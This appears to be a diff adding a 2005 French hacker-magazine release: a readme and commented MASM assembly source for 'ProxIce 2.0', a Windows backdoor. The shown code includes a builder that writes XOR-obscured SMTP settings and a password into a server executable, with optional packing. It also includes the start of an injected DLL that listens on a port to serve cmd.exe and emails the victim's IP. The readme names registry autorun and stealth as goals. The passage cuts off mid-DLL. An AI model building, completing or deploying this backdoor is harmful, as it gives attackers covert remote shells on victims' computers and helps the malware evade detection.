@@ -1,0 +1,1825 @@
+        ______              _                   _____ 
+	| ___ \            (_)                 / __  \
+	| |_/ / __ _____  ___  ___ ___  __   __`' / /'
+	|  __/ '__/ _ \ \/ / |/ __/ _ \ \ \ / /  / /  
+	| |  | | | (_) >  <| | (_|  __/  \ V / ./ /___
+	\_|  |_|  \___/_/\_\_|\___\___|   \_/  \_____/
+                                              
+                                              
+
+ 
+    -- [ ProxIce 2.0 - backdoor dll injection
+
+Tout d'abord, merci d'utiliser ce programme :) 
+
+Ecrit 100% pur ASM, avec MASM & WinASM.
+
+Fonctions :
+- Injection d'un thread qui lui même charge une DLL infectieuse
+- Cryptage des données a l'interieur du serveur
+- Mot de passe non décrypté en mémoire
+- Notification par mail
+- EditServer
+- Installation dans une clée de la BDR pour autorun
+- Test de la connexion
+- Backdoor sur le port de  votre choix
+- Commentaire total des sources :)
+
+Ce programme a été concu et programmé pour le mag #1 de  n0name, merci a
+Aphex  pour le type  d'injection, et ... c'est tout. Merci a bleyme pour
+avoir jeté un oeil sur mes sources, merci en fait a toute la team n0name
+d'être ce  qu'elle est ... cette  backdoor est la preuve  que l'on  peut
+rapidement  faire une  backdoor  simple, efficace, et un tant  soit  peu
+furtive de très petite taille ... les sources sont la a  titre  educatif
+et permettront a ceux qui le désirent d'apprendre  un peu en  comprenant
+pourquoi et ce qui se fait.
+
+Vous  aurez besoin de NetCat pour vous connecter au serveur, livré  avec
+le pack. Au fait, cette backdoor est concue pour XP / NT.
+
+Amusez vous bien :)
+
+
+
+
+
+
+Trois sources :
+
+	- EditServer.asm
+	- Server.asm
+	- Injected_Dll.asm
+
+Codes sources :
+
+
+	- EditServer.asm
+
+.386
+.model flat,stdcall
+option casemap:none
+
+DlgProc proto :DWORD,:DWORD,:DWORD,:DWORD
+
+include \masm32\include\windows.inc
+include \masm32\include\user32.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\shell32.inc
+includelib \masm32\lib\user32.lib
+includelib \masm32\lib\shell32.lib
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\strings.lib
+
+.data
+Offset_BackPort		EQU	4750
+Offset_SmtpPort		EQU	6259
+
+DlgName 			DB		"MyDialog",0
+sz_About_Text		DB 		"Welcome in the Ice's Backdoor, Written 100% in ASM, with MASM and WinAsm. :)",13,10,13,10,"Programmed in May 2005.",\
+                            13,10,"Made for example of a ASM Little Backdoor, just for n0name mag #1.",0
+sz_About_Text2		DB		13,10,13,10,"Thanks for using this tool. For feedbacks, comment, others, mail at : snow_mole@hotmail.com :)",13,10,13,10,"Thanks to Aphex for the injection model, and to n0name, for .. being n0name :)",13,10,13,10,"Program with his sources ( Server, EditServer, Resources )",13,10,13,10,"Thanks again, and Have Fun :]",13,10,13,10,"Icingtaupe",0
+sz_About_Caption	DB		"About ?",0
+HighPort			DB		"Error : You have setted a bad port. A port must be between 1 and 65535",0
+sz_ServerName		DB		"Server.exe",0
+sz_Server_Built		DB		"Your server is now ready. If you want to pack him, you can with the one of your choice. Have fun ;)",0
+sz_Server_Cap		DB		"Work Finished",0
+Xor_Key				EQU		200
+sz_Err0r			DB		"Critical err0r",0
+sz_SmtpTooLong		DB		"Err0r : The SMTP Server's name you set is too long.",0
+sz_PassTooLong		DB		"Err0r : The Pass you set is too long.",0
+sz_MailTooLong		DB		"Err0r : The 'Mail From' you set is too long.",0
+sz_RcptTooLong		DB		"Err0r : The destinatory's mail you set is too long",0
+sz_Enter			DB		">",13,10,0
+sz_Helo				DB		"helo ",0
+sz_MailFrom			DB		"mail from: <",0
+sz_RcptTo			DB		"rcpt to: <",0
+sz_EndOfMail		DB		"data",13,10,"IP de la Victime : ",0
+sz_Fsg				DB		"fsg.exe",0
+sz_FsgLine			DB		"fsg.exe Server.exe",0
+
+.const
+IDC_STATIC3004                  Equ 3004
+IDC_STATIC3015                  Equ 3015
+IDC_STATIC3017                  Equ 3017
+IDC_STATIC3009                  Equ 3009
+IDC_STATIC3010                  Equ 3010
+IDC_STATIC3011                  Equ 3011
+IDC_STATIC3007                  Equ 3007
+IDC_EXIT                        Equ 3002
+IDC_SMTP_Addr                   Equ 3005
+IDC_Mail_From                   Equ 3008
+IDC_Mail_To                     Equ 3013
+IDC_Back_Port                   Equ 3014
+IDC_Victim_Label                Equ 3016
+IDC_About                       Equ 3018
+IDC_MAKE                        Equ 3020
+IDC_SMTP_Port                   Equ 3021
+MAIN_ICO                        Equ 10000
+IDC_FsgPack                     Equ 3022
+
+
+.data?
+hInstance 			HINSTANCE ?
+Process_Info		PROCESS_INFORMATION <>
+Start_Info			STARTUPINFO <>
+
+
+hNewModule 			DWORD ?
+hProcess 			DWORD ?
+dwSize 				DWORD ?
+dwPid 				DWORD ?
+dwBytesWritten 		DWORD ?
+dwTid 				DWORD ? 
+
+sz_About_Txt		DB		256 DUP(?)
+
+sz_SMTP_Addr		DB		100 DUP(?)
+sz_Mail_From		DB		100 DUP(?)
+sz_Helo_Serv		DB		100 DUP(?)
+sz_Mail_To			DB		100 DUP(?)
+sz_End_Of_Mail		DB		100 DUP(?)
+sz_Victim_Label		DB		100 DUP(?)
+sz_TempBuffer		DB		800 DUP(?)
+
+nb_Back_Port		DD		?
+nb_SMTP_Port		DD		?
+hTemp				DD		?
+hRes				DD		?
+hFsg				DD		?
+hServer				DD		?
+hThread				DD		?
+Byte_Written		DD		?
+
+.const
+IDC_EXIT            EQU 	3002
+IDC_SMTP_Addr 		EQU  	3005
+IDC_Mail_From 		EQU  	3008
+IDC_Mail_To 		EQU  	3013
+IDC_Back_Port 		EQU  	3014
+IDC_Victim_Label 	EQU  	3016
+IDC_About 			EQU		3018
+IDC_MAKE 			EQU 	3020
+
+IDC_SMTP_Port 		EQU 	3021
+
+MAIN_ICO			EQU		10000
+.code
+
+
+start:
+
+	Push 0
+	Call GetModuleHandle
+	
+	Mov  hInstance, EAX	; On récupere un handle pour le processus actuel
+   
+    Push MAIN_ICO
+    Push hInstance
+    Call LoadIcon		; on charge l'icon
+    
+    Push 0
+    Push OFFSET DlgProc
+    Push 0
+    Push OFFSET DlgName
+    Push hInstance
+    Call DialogBoxParam	; on crée la boite de dialogue, huhu
+    
+    Push EAX
+    Call ExitProcess
+    
+_Encrypt proc
+	Push OFFSET sz_MailFrom		; On bouge la variable sz_MailFrom dans le buffer "sz_TempBuffer"
+	Push OFFSET sz_TempBuffer	; Sz_TempBuffer = "mail from: <"
+	Call lstrcat
+	
+	Push OFFSET sz_Mail_From	; On y concatene la valeur entrée par l'utilisateur, disons "moi@serveur.com"
+	Push OFFSET sz_TempBuffer	; sz_TempBuffer = "mail from: <moi@serveur.com"
+	Call lstrcat
+	
+	Push OFFSET sz_Enter		; On y concatene de nouveau la variable "enter" au buffer :
+	Push OFFSET sz_TempBuffer	; sz_TempBuffer = mail from: <moi@serveur.com>{retour chariot}
+	Call lstrcat				; Les caractères ASCII 13 et 10 representent les caractères de retour chariot. ( enter )
+	
+	Push SIZEOF sz_Mail_From	; On vide le buffer ou est situé ce qu'a entré l'utilisateur, pour le liberer
+	Push OFFSET sz_Mail_From
+	Call RtlZeroMemory
+	
+	Push OFFSET sz_TempBuffer	; On mets le contenu de sz_TempBuffer dans sz_Mail_From, soit un autre buffer.
+	Push OFFSET sz_Mail_From	; On est donc parti de "moi@serveur.com" pour arriver a 
+	Call lstrcat				; mail from: <moi@serveur.com>{enter}
+	
+	Push SIZEOF sz_TempBuffer
+	Push OFFSET sz_TempBuffer
+	Call RtlZeroMemory			; On vide le buffer sz_TempBuffer
+	
+	Push OFFSET sz_Helo			; On y place le début de notre sequence SMTP, soit "helo"
+	Push OFFSET sz_TempBuffer	
+	Call lstrcat
+	
+	Push OFFSET sz_SMTP_Addr 	; On prend l'adresse du serveur STMP qu'a entré l'utilisateur, 
+	Push OFFSET sz_TempBuffer	; on la copie dans sz_TempBuffer ( qui etait donc vide )
+	Call lstrcat				; Disons que SMTP_Addr = smtp.mail.com
+	
+	Mov EDI, OFFSET sz_TempBuffer ; Petite boucle afin de modifier le buffer
+	Mov ESI, EDI
+	@AddEnter:
+		Lodsb					; on prend le premier caractère de sz_TempBuffer, on le charge dans le registre AL
+		Cmp AL, 0				; On le compare a 0 ( fin de variable )
+		Je @EndAdd				; C'est la fin ? On saute a @EndAdd
+		Stosb					; Nop, pas encore la fin. On stock dans le buffer sz_TempBuffer 
+		Jmp @AddEnter
+	@EndAdd:
+		Mov AL, 13				; Ha, c'était le caractère de fin. Bon, on met 13 dans AL, première partie d'un "enter"
+		Stosb					; on l'ajoute au buffer sz_TempBuffer
+		Mov AL,10				; On met dans AL la deuxième partie du "enter"
+		Stosb					; on l'ajoute au buffer
+		Mov AL, 0				; caractère de fin mis dans AL ( faut bien terminer la variable )
+		Stosb					; et on stock ! :]
+								; On a donc ajouté les caractères afin d'effectuer un retour chariot au buffer
+	Push OFFSET sz_TempBuffer	; sz_TempBuffer = helo smtp.mail.com{enter}
+	Push OFFSET sz_Helo_Serv	; Et on le met dans le buffer "sz_Helo_Serv
+	Call lstrcat
+	
+	Push SIZEOF sz_TempBuffer	; On vide le buffer TempBuffer
+	Push OFFSET sz_TempBuffer
+	Call RtlZeroMemory		; #######################
+	
+	Push OFFSET sz_RcptTo		; on commence la séquence de rcpt ( => destinataire pour le SMTP )
+	Push OFFSET sz_TempBuffer	; on le met dans TempBuffer. Disons que le destinataire soit "destinataire@mail.com"
+	Call lstrcat				; sz_TempBuffer = rcpt to: <
+	
+	Push OFFSET sz_Mail_To		; On ajoute ce que l'utilisateur a entré
+	Push OFFSET sz_TempBuffer	; sz_TempBuffer = rcpt to: <destinataire@mail.com
+	Call lstrcat
+	
+	Push OFFSET sz_Enter		; On termine la variable :]
+	Push OFFSET sz_TempBuffer	; sz_TempBuffer = rcpt to: <destinataire@mail.com>{enter}
+	Call lstrcat
+	
+	Push SIZEOF sz_Mail_To		; On vide le buffer ou était placé ce qu'avait entré l'utilisateur
+	Push OFFSET sz_Mail_To
+	Call RtlZeroMemory
+	
+	Push OFFSET sz_TempBuffer	; On y met la  valeur de tempbuffer, on est donc parti de "destinataire@mail.com" 
+	Push OFFSET sz_Mail_To		; et on a terminé a "rcpt to: <destinataire@mail.com{enter}
+	Call lstrcat
+	
+	Push SIZEOF sz_TempBuffer
+	Push OFFSET sz_TempBuffer
+	Call RtlZeroMemory	; ########################
+
+	Mov EDI, OFFSET sz_Victim_Label	; Cryptage du password
+	Mov ESI, EDI
+	
+	@Crypt1:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt1
+		Xor Al, Xor_Key			; On xor chaque caractère par la valeur de xor_key, soit 200 ici
+		Stosb
+		Jmp @Crypt1
+	@EndCrypt1:
+		Stosb
+	
+	Mov EDI, OFFSET sz_SMTP_Addr ; idem pour l'adresse du serveur SMTP
+	Mov ESI, EDI
+	
+	@Crypt2:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt2
+		Xor Al, Xor_Key
+		Stosb
+		Jmp @Crypt2
+	@EndCrypt2:
+		Stosb
+	
+	Mov EDI, OFFSET sz_Mail_To ; derechef pour le buffer sz_Mail_To
+	Mov ESI, EDI
+	@Crypt3:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt3
+		Xor Al, Xor_Key
+		Stosb
+		Jmp @Crypt3
+	@EndCrypt3:
+		Stosb
+	
+	Mov EDI, OFFSET sz_Mail_From 	; Blablabla ..
+	Mov ESI, EDI
+	@Crypt4:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt4
+		Xor Al, Xor_Key
+		Stosb
+		Jmp @Crypt4
+	@EndCrypt4:
+		Stosb	
+		
+	Mov EDI, OFFSET sz_End_Of_Mail	; Ca commence a devenir répétitif. Pourquoi crypter tout ca ? Parfce que le serveur 
+	Mov ESI, OFFSET sz_EndOfMail	; en a besoin, et que l'on ne désire pas que tout soit lisible par 
+									; simple hexaédition .. donc, cryptage oblige. :]
+	@Crypt5:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt5
+		Xor Al, Xor_Key
+		Stosb
+		Jmp @Crypt5
+	@EndCrypt5:
+		Stosb	
+	
+	Mov EDI, OFFSET sz_Helo_Serv
+	Mov ESI, EDI
+	
+	@Crypt6:
+		Lodsb
+		Cmp AL, 0
+		Je @EndCrypt6
+		Xor Al, Xor_Key
+		Stosb
+		Jmp @Crypt6
+	@EndCrypt6:
+		Stosb	
+	Ret
+_Encrypt EndP
+
+    
+DlgProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+    .IF uMsg == WM_INITDIALOG
+    	Push IDC_SMTP_Addr
+    	Push hWnd
+    	Call GetDlgItem	
+    	
+    	Push EAX
+    	Call SetFocus
+    	
+    	Push 10000
+		Push hInstance
+		Call LoadIcon
+		
+		Push EAX
+		Push 1
+		Push WM_SETICON
+		Push hWnd
+		Call SendMessage
+    .ELSEIF uMsg == WM_CLOSE
+    	Push 0
+    	Push hWnd
+    	Call EndDialog
+    .ELSEIF uMsg == WM_COMMAND
+        Mov  EAX,wParam 
+        Mov EDX,wParam
+        Shr EDX,16
+            .IF DX == BN_CLICKED		
+                .IF AX == IDC_MAKE	; Han, il a cliqué sur "Make Server" !
+                	Push FALSE
+                	Push 0
+                	Push IDC_Back_Port
+                	Push hWnd
+                	Call GetDlgItemInt
+
+                	Mov  nb_Back_Port,  EAX	; on récupere les ports pour la backdoor et le SMTP
+                	
+                	Push FALSE
+                	Push 0
+                	Push IDC_SMTP_Port
+                	Push hWnd
+                	Call GetDlgItemInt 
+
+                	Mov  nb_SMTP_Port,  EAX
+                	
+                	
+                	.IF nb_Back_Port > 65535 ; verification si on s'est pas fait avoir, que le portsoit supérieur au max, soit 65535
+            		  	Push MB_OK
+	                	Push 0
+	                	Push OFFSET HighPort
+	                	Push hWnd
+	                	Call MessageBox 
+	                	
+	                	JMP @End
+                	               	                	
+               		.ELSEIF nb_SMTP_Port > 65535
+				      	Push MB_OK
+	                	Push 0
+	                	Push OFFSET HighPort
+	                	Push hWnd
+	                	Call MessageBox 
+	                	
+	                	JMP @End
+                	              	
+                	.ENDIF		; Non, c'est cool, on continue
+                                	
+                	Push 100
+                	Push OFFSET sz_SMTP_Addr
+                	Push IDC_SMTP_Addr
+                	Push hWnd
+                	Call GetDlgItemText	 ; On récupere le texte entré par l'utilisateur pour l'adresse du serveur SMTP
+                		.IF EAX > 33	; Verification de si c'est pas trop long ? Non ? Alors on continue !
+	                		Push SIZEOF sz_SMTP_Addr
+	                		Push OFFSET sz_SMTP_Addr
+	                		Call RtlZeroMemory
+	                		
+	                		Push MB_OK+MB_ICONHAND
+	                		Push OFFSET sz_SmtpTooLong
+	                		Push OFFSET sz_Err0r
+	                		Push hWnd
+	                		Call MessageBox
+	                			
+	                		Jmp @End	
+                		.ENDIF 
+                	Push 100
+                	Push OFFSET sz_Mail_From
+                	Push IDC_Mail_From
+                	Push hWnd
+                	Call GetDlgItemText	; Idem .. pour l'envoyeur du mail
+                		.IF EAX > 37
+                		Push SIZEOF sz_SMTP_Addr
+                		Push OFFSET sz_SMTP_Addr
+                		Call RtlZeroMemory
+                		
+                		Push SIZEOF sz_Mail_From
+                		Push OFFSET sz_Mail_From
+                		Call RtlZeroMemory
+                		
+                		Push MB_OK+MB_ICONHAND
+                		Push OFFSET sz_MailTooLong
+                		Push OFFSET sz_Err0r
+                		Push hWnd
+                		Call MessageBox
+                		
+                		Jmp @End
+                		.ENDIF 
+                	
+                	Push 100
+                	Push OFFSET sz_Mail_To
+                	Push IDC_Mail_To
+                	Push hWnd
+                	Call GetDlgItemText		; Pour le destinataire, encore une fois :]
+                	
+                		.IF EAX > 33
+	                		Push SIZEOF sz_SMTP_Addr
+	                		Push OFFSET sz_SMTP_Addr
+	                		Call RtlZeroMemory
+	                		
+	                		Push SIZEOF sz_Mail_From
+	                		Push OFFSET sz_Mail_From
+	                		Call RtlZeroMemory
+	                		
+	                		Push SIZEOF sz_Mail_To
+	                		Push OFFSET sz_Mail_To
+	                		Call RtlZeroMemory
+	                		
+	                		Push MB_OK+MB_ICONHAND
+	                		Push OFFSET sz_RcptTooLong
+	                		Push OFFSET sz_Err0r
+	                		Push hWnd
+	                		Call MessageBox
+	                		
+	                		Jmp @End
+                		.ENDIF 
+                	
+                	Push 100
+                	Push OFFSET sz_Victim_Label
+                	Push IDC_Victim_Label
+                	Push hWnd
+                	Call GetDlgItemText	; Allez, parce qu'on adore ca, on le refait pour le password !
+                	
+                		.IF EAX > 35
+	                		Push SIZEOF sz_Victim_Label
+	                		Push OFFSET sz_Victim_Label
+	                		Call RtlZeroMemory
+	                		
+	                		Push SIZEOF sz_SMTP_Addr
+	                		Push OFFSET sz_SMTP_Addr
+	                		Call RtlZeroMemory
+	                		
+	                		Push SIZEOF sz_Mail_From
+	                		Push OFFSET sz_Mail_From
+	                		Call RtlZeroMemory
+	                		
+	                		Push SIZEOF sz_Mail_To
+	                		Push OFFSET sz_Mail_To
+	                		Call RtlZeroMemory
+	                		
+	                		Push MB_OK+MB_ICONHAND
+	                		Push OFFSET sz_PassTooLong
+	                		Push OFFSET sz_Err0r
+	                		Push hWnd
+	                		Call MessageBox
+	                		
+	                		Jmp @End
+                		.ENDIF 
+                	
+                	Mov EDI, OFFSET sz_Victim_Label ; On ajotue le caractère "10" qui fait partie du caractère entrée
+                	Mov ESI, EDI	; On fait ceci car Netcat envoie le caractère 10 en tant qu'{enter}
+                	@Loop:			; Or, vu que l'on s'y connecte et que le serveur fait une comparaison 
+                	Lodsb			; entre le pass crypté et ce que l'on a entré, il FAUT specifier le caractère 10 le buffer
+                	Cmp AL,0
+                	Je @EndLoop
+                	Stosb
+                	Jmp @Loop
+                	@EndLoop:
+                	Mov AL, 10
+                	Stosb
+                	Mov AL, 0
+                	Stosb
+                	                       	
+               	Call _Encrypt		; On appelle la routine déja commentée, qui crypte le tout et prépare les données entrées
+               						; pour l'écriture du serveur 
+
+                	; Ouverture et Creation du fichier server 
+                	Push 0
+                	Push FILE_ATTRIBUTE_NORMAL
+                	Push CREATE_ALWAYS
+                	Push 0
+                	Push 0
+                	Push GENERIC_WRITE
+                	Push OFFSET sz_ServerName
+                	Call CreateFile
+
+                	Mov  hServer, EAX
+                   
+                	Push RT_RCDATA		; On le localise dans les resources
+					Push 12345
+					Push 0
+					Call FindResource
+					
+					Mov  hTemp, EAX
+					
+					Push EAX		; On le charge
+					Push 0
+					Call LoadResource
+					
+					Mov  hRes, EAX
+					
+					Push hTemp	; On calcule sa taille
+					Push 0
+					Call SizeofResource
+					
+					Push 0
+					Push OFFSET Byte_Written
+					Push EAX
+					Push hRes
+					Push hServer
+					Call WriteFile	; On l'ecrit !
+					
+               
+					; Inscription du mot de passe
+                	Push FILE_BEGIN
+                	Push 0
+                	Push 7891			; Offset ou l'on doit ecrire le pass
+                	Push hServer
+                	Call SetFilePointer ; On bouge le filepointer la bas
+                              
+                  	Push OFFSET sz_Victim_Label	; on calcule la taille du pass
+                	Call lstrlen
+                	
+                	Inc  EAX		; on ajoute dans la taille le 'null caracter', qui termine la variable
+                					; car lstrlen ne le note pas 
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET sz_Victim_Label	; on écrit donc dans le serveur le pass crypté
+                	Push hServer		; avec la prise en charge du 0 a la fin
+                	Call WriteFile		; pour que le serveur prenne bien la variable et rien d'autre après
+                						; ( la place alouée dans le serveur est pleine d'espace. Sans ce 0, le serveur compterait
+                						; ces espaces, en PLUS du pass. On aurait donc "pass{enter}( pleins d'espaces ) ...
+                	Push 100
+                	Call Sleep			; Petite pause, soufflons
+                	; Ecriture du "Helo *server*"
+                	Push FILE_BEGIN
+                	Push 0
+                	Push 7961			; On refait pareil, pour la sequence SMTP
+                	Push hServer
+                	Call SetFilePointer
+                	
+                	Push OFFSET sz_Helo_Serv	
+                	Call lstrlen
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET sz_Helo_Serv ; On inscrit le "helo smtp.mail.com"
+                	Push hServer			; SANS prendre en charge le 0, car s'ensuit tous le reste des settings pour le
+                	Call WriteFile			; serveur SMTP. Dans le serveur, 
+                							; Nous avons défini la variable a envoyer au serveur sous un seul nom,
+                	Push 100				; ce qui explique le fait que nous ne devons pas ajouter le 0 ni modifier l'offset du pointeur sur le fichier
+                	Call Sleep				; afin que tout soit considéré comme une seule variable
+                	; Ecriture du "Mail From:"
+                	Push OFFSET sz_Mail_From
+                	Call lstrlen
+               	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET sz_Mail_From	; Qu'est ce que je disais ? :]
+                	Push hServer
+                	Call WriteFile
+                	
+                	Push 100
+                	Call Sleep
+                	; Ecriture du "Mail To:"
+            	
+                	Push OFFSET sz_Mail_To
+                	Call lstrlen
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET sz_Mail_To
+                	Push hServer
+                	Call WriteFile
+                	
+                	Push 100
+                	Call Sleep
+                	
+                	Push OFFSET sz_End_Of_Mail
+                	Call lstrlen					; on a donc ecrit dans le serveur, la sequence suivante, en crypté :
+                									; helo smtp.server.com{enter}
+                	Inc EAX							; mail from: <envoyeur@mail.com>{enter}
+                	Push 0							; rcpt to: <destinataire@mail.com>{enter}
+                	Push OFFSET Byte_Written		; data{enter}
+                	Push EAX						; IP De la victime :{fin de la variable}
+                	Push OFFSET sz_End_Of_Mail		; La variable sera ainsi recuperée, l'IP ajoutée a cette variable.
+                	Push hServer
+                	Call WriteFile
+
+   
+                	; Inscription de l'adresse SMTP
+                	Push FILE_BEGIN
+                	Push 0
+                	Push 7927
+                	Push hServer					; On ecrit l'adresse pour la connexion au serveur
+                	Call SetFilePointer				; SMTP, sans le helo 
+                	
+                	Push OFFSET sz_SMTP_Addr
+                	Call lstrlen
+                	
+                	Inc  EAX						; ce coup ci, on prend en charge le 0
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET sz_SMTP_Addr
+                	Push hServer
+                	Call WriteFile
+
+                	; Ecriture du "Backdoor Port"
+                	Push FILE_BEGIN
+                	Push 0
+                	Push Offset_BackPort			; Offset_BackPort est défini dans la section .data
+                	Push hServer
+                	Call SetFilePointer
+                	
+                	Push OFFSET nb_Back_Port
+                	Call lstrlen
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET nb_Back_Port
+                	Push hServer
+                	Call WriteFile
+                	
+                	; Inscription du port SMTP
+                	Push FILE_BEGIN
+                	Push 0
+                	Push Offset_SmtpPort		; Idem
+                	Push hServer
+                	Call SetFilePointer
+                	
+                	Push OFFSET nb_SMTP_Port
+                	Call lstrlen
+                	
+                	Push 0
+                	Push OFFSET Byte_Written
+                	Push EAX
+                	Push OFFSET nb_SMTP_Port
+                	Push hServer
+                	Call WriteFile
+
+					Push IDC_FsgPack
+					Push hWnd
+					Call GetDlgItem		; On prend le handle pour le controle "FSG Pack"
+					
+					Push 0
+					Push 0
+					Push BM_GETCHECK
+					Push EAX
+					Call SendMessage	; Il est coché, le bougre ?
+
+						.IF EAX == BST_CHECKED	; Ha, oui !
+							Push hServer
+                			Call CloseHandle	; On ferme le handle vers le serveur, pour le laisser "libre"
+						
+							Push 0
+		                	Push FILE_ATTRIBUTE_NORMAL
+		                	Push CREATE_ALWAYS
+		                	Push 0
+		                	Push 0
+		                	Push GENERIC_WRITE
+		                	Push OFFSET sz_Fsg
+		                	Call CreateFile		; On crée le ficher FSG.exe, pour packer le serveur 
+		
+		                	Mov  hFsg, EAX
+		                   
+		                	Push RT_RCDATA
+							Push 12344
+							Push 0
+							Call FindResource	; même chose qu'avec le serveur 
+							
+							Mov  hTemp, EAX
+							
+							Push EAX
+							Push 0
+							Call LoadResource
+							
+							Mov  hRes, EAX
+							
+							Push hTemp
+							Push 0
+							Call SizeofResource
+							
+							Push 0
+							Push OFFSET Byte_Written
+							Push EAX
+							Push hRes
+							Push hFsg
+							Call WriteFile
+							
+							Push hFsg
+							Call CloseHandle	; on ferme le handle vers le packeur, pour le laisser libre et utilisable
+							
+							Push SW_SHOW
+							Push 0
+							Push OFFSET sz_ServerName
+							Push OFFSET sz_Fsg
+							Push 0
+							Push hWnd
+							Call ShellExecute	; on l'execute avec en parametre le nom du serveur, soit fsg.exe server.exe
+							
+							Push 1500
+							Call Sleep		; on attend une seconde et demi, que le programme ait terminé ( pour le fun )
+							
+							.ENDIF
+                	Push MB_OK+MB_ICONASTERISK
+                	Push OFFSET sz_Server_Cap
+                	Push OFFSET sz_Server_Built
+                	Push hWnd	
+                	Call MessageBox		; On avertit "Hey gars, ton serveur est terminé et packé si besoin est !"
+                	
+                	@End:
+                	                	
+                	Push hServer
+                	Call CloseHandle
+                	
+			       	Push SIZEOF sz_SMTP_Addr	; Remise a zéro de tous les buffers ou presque, pour le cas ou.
+					Push OFFSET sz_SMTP_Addr
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_Mail_From
+					Push OFFSET sz_Mail_From
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_Helo_Serv
+					Push OFFSET sz_Helo_Serv
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_Mail_To
+					Push OFFSET sz_Mail_To
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_Victim_Label
+					Push OFFSET sz_Victim_Label
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_TempBuffer
+					Push OFFSET sz_TempBuffer
+					Call RtlZeroMemory
+					
+					Push SIZEOF sz_End_Of_Mail
+					Push OFFSET sz_End_Of_Mail
+					Call RtlZeroMemory
+					                	                             
+                .ELSEIF AX == IDC_About	; l'utilisateur a créé sur le bouton "?"
+                	Push 256
+                	Push OFFSET sz_About_Txt
+                	Call RtlZeroMemory
+ 
+                	Push OFFSET sz_About_Text
+                	Push OFFSET sz_About_Txt
+                	Call lstrcat			; on affiche le texte, tout simplement
+                	
+  					Push OFFSET sz_About_Text2
+                	Push OFFSET sz_About_Txt
+                	Call lstrcat
+                	
+                	Push MB_OK+MB_ICONASTERISK
+                	Push OFFSET sz_About_Caption
+                	Push OFFSET sz_About_Txt
+                	Push hWnd
+                	Call MessageBox                
+                .ELSEIF AX == IDC_EXIT
+                	Push 0
+                	Push hWnd
+                	Call EndDialog
+                .ENDIF
+            .ENDIF
+       
+    .ELSE
+        Mov EAX, FALSE
+        Ret
+    .ENDIF
+    Mov EAX, TRUE
+    Ret
+DlgProc ENDP
+ END start
+
+
+
+	- fin d'EditServer.asm
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	- Injected_Dll.asm
+
+
+.386
+.MODEL flat,stdcall
+
+OPTION CASEMAP:NONE
+include \masm32\include\windows.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\masm32.inc
+include \masm32\include\rasapi32.inc
+include \masm32\include\advapi32.inc
+include \masm32\include\shell32.inc
+include \masm32\include\wsock32.inc
+
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\shell32.lib
+includelib  \masm32\lib\masm32.lib
+includelib \masm32\lib\rasapi32.lib
+includelib \masm32\lib\advapi32.lib
+includelib \masm32\lib\wsock32.lib
+
+_Notification PROTO
+
+.DATA
+Xor_Key			EQU		200
+Port_Smtp		EQU		25
+Port_Cmd		EQU		12345
+sz_Exit			DB		"exit",10,0
+sz_Present		DB		"Bienvenue dans ProxIce v 2.0, by Icingtaupe for n0name.",13,10,0
+sz_EnterPass	DB		"Veuillez entrer le password : ",0
+sz_BadPass		DB		"Mauvais Password.",13,10,0
+sz_Password		DB		"                                   ",0
+sz_SmtpServer	DB		"                                 ",0				; On retrouve les endroits dont on avait parlé dans l'editserver
+sz_Helo			DB		"helo                                  ",13,10,\
+						"mail from :                                     ",13,10,\
+						"rcpt to :                                       ",13,10,\
+						"data",13,10,"IP de la Victime : ",0 
+sz_EndToSend	DB		13,10,13,10,"Okay, now it's all right. Have a Good Day :]",\
+						13,10,13,10,13,10,".",13,10,13,10,"quit",13,10,0
+sz_DllName		DB		"ws_sk32.dll",0
+sz_Cmd			DB		"cmd.exe",0
+
+.data?
+Tr_Connection 		RASCONN 0FFh dup ({})
+sz_WsaData			WSADATA<> 
+sz_WsaData_			WSADATA<> 
+ProcInfo			PROCESS_INFORMATION<>
+Startup				STARTUPINFO<>
+Sat					SECURITY_ATTRIBUTES<>
+SockAdress			sockaddr_in<>
+SockAdress_			sockaddr_in<>
+
+hClientSock			DD ?
+hSock				DD ?
+hCon	   			DD ?
+hShellOutToSocket	DD ?
+hShellOutShell		DD ?
+hShellInToSocket	DD ?
+hShellInShell		DD ?
+
+sz_BytesWritten		DD	?
+sz_BytesRead		DD	?
+RasCon_Buf  		DD ?
+TID					DD ?
+
+sz_VicIP			DB 	40  DUP(?)
+sz_LocalHostname	DB	256 DUP(?)
+sz_ToSend			DB	400 DUP(?)
+sz_RecvBuffer		DB	80000 DUP(?)
+sz_Buffer			DB	80000 DUP(?)
+
+.code
+
+_ListenThread proc
+LOCAL hSockListen:DWORD
+		
+	@The_Beginning:
+	Push 200
+	Call Sleep		; On commence par attendre un peu, ne soyons pas trop gourmands.
+		
+	Push OFFSET sz_WsaData_
+	Push 101h
+	Call WSAStartup	; On commence, c'est parti, on initialise le systeme de socket et Winsock
+
+	Push 0
+	Push SOCK_STREAM
+	Push AF_INET
+	Call socket			; On crée notre socket, certes, il est donc alloué. A noter qu'il n'est pas ecoute, ni rien
+	Mov  hSockListen, EAX
+	
+	Mov EAX, Port_Cmd	; On calcule le port que l'on doit specifier. On pourrait utiliser l'API htons, mais 
